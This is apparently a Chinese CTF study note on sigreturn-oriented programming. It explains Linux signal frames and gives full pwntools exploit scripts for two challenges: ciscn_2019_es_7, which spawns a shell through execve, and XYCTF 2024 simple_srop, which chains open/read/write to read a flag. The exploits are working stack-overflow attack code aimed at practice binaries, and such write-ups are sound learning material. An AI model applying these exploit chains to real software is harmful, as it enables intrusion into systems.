---
title: SROP
date: '2024-12-26 15:59:14'
updated: '2025-04-10 20:05:59'
---
简单来说就是利用栈溢出和关键的`Sigreturn`系统调用来实现控制寄存器的目的。

但是注意！！！<font style="color:#000000;">会改变栈顶指针RSP/ESP，有时候并不想改变这两个的值。</font>

## Signal 机制
`<font style="color:rgba(0, 0, 0, 0.87);">signal</font>`<font style="color:rgba(0, 0, 0, 0.87);"> 机制是类</font>`<font style="color:rgba(0, 0, 0, 0.87);">unix</font>`<font style="color:rgba(0, 0, 0, 0.87);"> 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。</font>

<font style="color:rgba(0, 0, 0, 0.87);">一般来说，信号机制常见的步骤如下图所示：</font>

![](/images/3e42adb19e061e3aa4b5c75d45c960cb.png)

1. <font style="color:rgba(0, 0, 0, 0.87);">内核向某个进程发送 </font>`<font style="color:rgba(0, 0, 0, 0.87);">signal</font>`<font style="color:rgba(0, 0, 0, 0.87);"> 机制，该进程会被暂时挂起，进入内核态。</font>
2. <font style="color:rgba(0, 0, 0, 0.87);">内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入 </font>`<font style="color:rgba(0, 0, 0, 0.87);">signal</font>`<font style="color:rgba(0, 0, 0, 0.87);"> 信息，以及指向 </font>`<font style="color:rgba(0, 0, 0, 0.87);">sigreturn</font>`<font style="color:rgba(0, 0, 0, 0.87);"> 的系统调用地址。此时栈的结构如下图所示，我们称 </font>`<font style="color:rgba(0, 0, 0, 0.87);">ucontext</font>`<font style="color:rgba(0, 0, 0, 0.87);"> 以及 </font>`<font style="color:rgba(0, 0, 0, 0.87);">siginfo</font>`<font style="color:rgba(0, 0, 0, 0.87);"> 这一段为 </font>`<font style="color:rgba(0, 0, 0, 0.87);">Signal Frame</font>`<font style="color:rgba(0, 0, 0, 0.87);">。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 </font>`<font style="color:rgba(0, 0, 0, 0.87);">signal handler</font>`<font style="color:rgba(0, 0, 0, 0.87);"> 中处理相应的 </font>`<font style="color:rgba(0, 0, 0, 0.87);">signal</font>`<font style="color:rgba(0, 0, 0, 0.87);">。因此，当 </font>`<font style="color:rgba(0, 0, 0, 0.87);">signal handler</font>`<font style="color:rgba(0, 0, 0, 0.87);"> 执行完之后，就会执行 </font>`<font style="color:rgba(0, 0, 0, 0.87);">sigreturn</font>`<font style="color:rgba(0, 0, 0, 0.87);"> 代码。</font>



> `<font style="color:rgba(0, 0, 0, 0.87);">Sigreturn</font>`<font style="color:rgba(0, 0, 0, 0.87);">系统调用在类 </font>`<font style="color:rgba(0, 0, 0, 0.87);">unix</font>`<font style="color:rgba(0, 0, 0, 0.87);"> 系统发生 </font>`<font style="color:rgba(0, 0, 0, 0.87);">signal</font>`<font style="color:rgba(0, 0, 0, 0.87);"> 的时候会被间接地调用，</font>
>
> <font style="color:rgba(0, 0, 0, 0.87);">用于从内核态转换回用户态时寄存器的值的恢复，</font>
>
> <font style="color:rgba(0, 0, 0, 0.87);">可以简单认为调用</font>`<font style="color:rgba(0, 0, 0, 0.87);">Sigreturn</font>`<font style="color:rgba(0, 0, 0, 0.87);">相当于</font>`<font style="color:rgba(0, 0, 0, 0.87);">pop</font>`<font style="color:rgba(0, 0, 0, 0.87);">了好多个寄存器，将栈上的值全部对应地回到寄存器中。</font>
>

#### 注意
pwntools（x64）生成的 sigreturnframe 的大小是 248（0xf8）个字节

## 题目
### ciscn_2019_es_7 来自 BUUCTF
`main`函数就一个`vuln`函数：

![](/images/7ade6e09fc9fac9362da192afa8032fa.png)

要注意的是这两个都是系统调用的函数，所以可以控制 `rax` 的值来进行别的系统调用

程序还给了 gadget：

![](/images/b9762d3119a2ca34bf00e6e94de64e87.png)

控制了 rax 的值，很明显用来进行系统调用，<font style="background-color:#FBDE28;">而 0xF 是</font>`<font style="background-color:#FBDE28;">Sigreturn</font>`<font style="background-color:#FBDE28;">的系统调用号</font>

#### 解法一：利用 write 泄露的地址向栈上写/bin/sh
不同版本的 libc 栈上存的数据不一样，本地和远程环境不一定一样，动调结果可能没用

#### 解法二（通法）：将/bin/sh 写在 bss 段
同样都是要把`/bin/sh`写在某个地方来用，直接写到 bss 段就直接省去了获取栈地址的步骤

exp：

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

# link=remote("",)
link=process("./srop")

bss=0x601030 #用来放"/bin/sh"的地址，bss段开头
syscall_addr=0x400517 #syscall的地址
sigreturn=p64(0x4004DA)+p64(syscall_addr) #Sigreturn系统调用

execve_frame=SigreturnFrame()
execve_frame.rax=constants.SYS_execve #当前系统中execve的系统调用号
execve_frame.rdi=bss #"/bin/sh"
execve_frame.rsi=0
execve_frame.rdx=0
execve_frame.rip=syscall_addr
fake_stack=b'/bin/sh\x00'+sigreturn+bytes(execve_frame)

read_frame=SigreturnFrame()
read_frame.rax=constants.SYS_read #当前系统中read的系统调用号
read_frame.rdi=0
read_frame.rsi=bss #将"/bin/sh"写入对应bss段位置
read_frame.rdx=len(fake_stack) #读入对应长度的字节
read_frame.rsp=bss+8 #把rsp移到"/bin/sh"后的sigreturn的位置
read_frame.rip=syscall_addr #系统调用

payload=b'a'*0x10
payload+=sigreturn+bytes(read_frame)

# gdb.attach(link)

# pause()
link.send(payload)
# pause()
link.send(fake_stack)

link.interactive()
```

### simple_srop（XYCTF 2024）
![](/images/56e4f8c494d4891b4b3be70a851546b5.png)

![](/images/63a3c2103987edf8c61500a1e15443da.png)

![](/images/cbfd43cdcf9755a2de882ae592de5a10.png)

没有 canary，程序就一个大大的 read，还读了 0x200 个字节，超级大溢出（

![](/images/03ee84ef671251f8d90f5406c4ac5553.png)

看函数表第一眼想到 orw 和 SROP，

![](/images/012275085f49db400245b32fc5fce80e.png)

限制了系统调用不能调用 execve（一直不知道这个 322 是怎么来的，系统调用号没这么大的啊...）

想着是不是用 SROP 实现 orw 来获得 flag

但是程序的 read 没办法知道写入的地址，想着先用第一个 sigreturn 调用 read 在 bss 段这个地址已知的内存写进接下来的 SROP 链

read 要得有个内存地址存 flag 进去，考虑 bss 段

看了看 pwntools 生成的 sigreturnframe 的长度，好像是固定 248 个字节，

好像可以利用这个长度算出来填进 bss 段的不同 sigreturnframe 的偏移，来实现多次 sigreturn

exp ，但是因为报错搞半天不知道怎么改

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

# link=remote("",)
link=process("./vuln")

bss=0x404100
syscall=p64(0x40129D)
sigreturn=p64(0x401292)

write_frame=SigreturnFrame()
write_frame.rax=constants.SYS_write
write_frame.rdi=1 #标准输出
write_frame.rsi=bss+0x400 #读到的flag存在这里
write_frame.rdx=0x50 #输出长度
write_frame.rip=syscall

read_frame2=SigreturnFrame()
read_frame2.rax=constants.SYS_read
read_frame2.rdi=3 #文件描述符
read_frame2.rsi=bss+0x400 #读到的flag存在这里
read_frame2.rdx=0x100 #读取长度
read_frame2.rsp=bss+0x208 #write
read_frame2.rip=syscall

open_frame=SigreturnFrame()
open_frame.rax=constants.SYS_open
open_frame.rdi=bss
open_frame.rsi=0
open_frame.rsp=bss+0x108 #read
open_frame.rip=syscall

bss_stack=b'/flag\x00\x00\x00'+sigreturn+bytes(open_frame)+sigreturn+bytes(read_frame2)+sigreturn+bytes(write_frame)

read_frame=SigreturnFrame()
read_frame.rax=constants.SYS_read
read_frame.rdi=0 #标准输入
read_frame.rsi=bss
read_frame.rdx=0x200 #第一次read长度
read_frame.rsp=bss+8 #open
read_frame.rip=syscall

payload=b'a'*0x28
payload+=sigreturn+bytes(read_frame)
link.send(payload)

gdb.attach(link)
pause()

sleep(1)
link.send(bss_stack)

link.interactive()
```

遇到了这个报错，后面 clby 师傅说这个思路是正确的，

![](/images/023dac8dcf2b26a48d80da983edcaf1e.png)

clby 师傅给的 exp：

```python
from pwn import *
e = ELF('./vuln')
# r = remote('172.21.78.37', 49320)
r = process('./vuln')
# libc = elf.libc
context.log_level = 'debug'
context.arch = 'amd64'

syscall = 0x40129D
sigretrun = 0x401296
main = 0x4012A3
bss = e.bss()+0x100
flag_str = bss
store_flag = bss+0x500

gdb.attach(r, 'b *0x40129d')
pause()

frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = bss
frame.rdx = 0x400
frame.rip = syscall
frame.rbp = 0x404168
frame.rsp = 0x404168

flag_pay = b'flag.txt'.ljust(  # 这边传入flag是没有意义的，真正写入bss段的flag是下面那个payload
    0x28, b'a')+p64(sigretrun)+bytes(frame)
r.sendline(flag_pay)
sleep(0.2)

# rax = 2,open(flag,0,0) to get flag
# 0 represents READONLY
openflag = SigreturnFrame()
openflag.rax = 0x2
openflag.rdi = flag_str
openflag.rsi = 0x0
openflag.rcx = 0x0
openflag.rdx = 0x0
openflag.rip = syscall
openflag.rbp = 0x404268
openflag.rsp = 0x404268

# rax = 0,read(3,bss,100)from (open) to (bss)
readflag = SigreturnFrame()
readflag.rax = 0x0
readflag.rdi = 3
readflag.rsi = store_flag
readflag.rdx = 0x100
readflag.rip = syscall
readflag.rbp = 0x404368
readflag.rsp = 0x404368

# rax = 1,write(1,bss,100) from (bss) to me
writeflag = SigreturnFrame()
writeflag.rax = 0x1
writeflag.rdi = 0x1
writeflag.rsi = store_flag
writeflag.rdx = 0x100
writeflag.rip = syscall
writeflag.rbp = 0xdeadbeef
writeflag.rsp = 0xdeadbeef


payload = b'flag.txt'
payload += p64(sigretrun)
payload += bytes(openflag)

payload += p64(sigretrun)
payload += bytes(readflag)

payload += p64(sigretrun)
payload += bytes(writeflag)

# gdb.attach(r)
# pause()
sleep(0.2)
r.sendline(payload)

r.interactive()
```

